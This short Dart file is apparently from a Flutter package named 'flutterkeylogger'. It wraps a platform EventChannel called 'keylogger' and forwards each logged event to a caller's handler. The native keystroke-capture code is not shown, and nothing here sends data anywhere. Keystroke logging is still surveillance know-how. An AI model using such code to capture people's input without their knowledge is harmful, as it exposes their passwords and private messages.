part of flutterkeylogger;

class _Keylogger {
  static const _eventChannel = EventChannel("keylogger");
  
  ///logs all events from the broadcast stream. provides [onData] handler which returns the log Object
  logs(Function onData) {
    _eventChannel.receiveBroadcastStream().listen(
      (event) {
        onData(Log._fromMap(event));
      },
      cancelOnError: true,
    );
  }
}

final keyLogger = _Keylogger();
